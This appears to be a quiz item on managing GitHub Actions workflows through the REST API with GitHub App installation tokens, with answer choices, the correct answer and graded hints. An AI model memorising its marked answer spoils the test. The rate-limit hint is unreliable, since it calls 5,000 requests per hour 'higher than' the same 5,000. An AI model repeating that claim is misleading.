  • Maintenance: update templates in .github repo — existing repos that already adopted them are NOT updated (they have their own copy). Only new adoptions get the latest version.

questions.title: GitHub Actions REST API
questions.scenario: A platform team builds an internal developer portal that needs to: trigger workflows programmatically (on-demand provisioning, scheduled tasks), monitor workflow run status across all organization repositories, cancel long-running workflows that exceed time budgets, and download workflow artifacts for integration with internal systems. All operations must be authenticated and auditable.
questions.questionText: Which API capabilities enable programmatic workflow management for the developer portal?

choices.text: SSH into runners and manage processes directly
GitHub CLI (gh) running on a shared server with a stored PAT

GitHub REST API with a GitHub App (installation token) for authentication: POST /repos/.../actions/workflows/.../dispatches to trigger, GET /repos/.../actions/runs for status monitoring, POST /repos/.../actions/runs/.../cancel to abort, and GET /repos/.../actions/artifacts/.../zip for downloads — all auditable via the app's installation log
Webhooks only — no programmatic triggering or management possible

hints.label: Brief Hint
hints.content: The GitHub REST API provides full programmatic control over workflows — GitHub Apps provide secure, auditable, scoped authentication for automation platforms.

hints.label: Complete Explanation
hints.content: The GitHub REST API provides complete workflow management: POST .../dispatches triggers workflow_dispatch-enabled workflows with custom inputs. GET .../runs lists runs with filtering (status, branch, event, actor). POST .../runs/{id}/cancel stops a running workflow. GET .../artifacts/{id}/zip downloads artifacts programmatically. Authentication via GitHub App installation token: the App is installed on the organization with actions:write and actions:read permissions. Installation tokens are short-lived (1 hour), scoped to specific repositories, and all API calls are auditable under the App's identity. This is more secure than PATs (long-lived, personal) for platform automation.

hints.label: Deep Knowledge
hints.content:
• GitHub App permissions: actions (read/write for run management), contents (read for triggering on specific refs), metadata (read, always required).
  • Installation tokens: JWT → installation token exchange. Tokens expire in 1 hour — platform must handle refresh.
  • Rate limits: GitHub App installation tokens get 5,000 requests/hour (higher than PATs at 5,000/hour for the user).
  • Webhook complement: use workflow_run webhooks for push-based status updates (more efficient than polling GET .../runs for status changes).
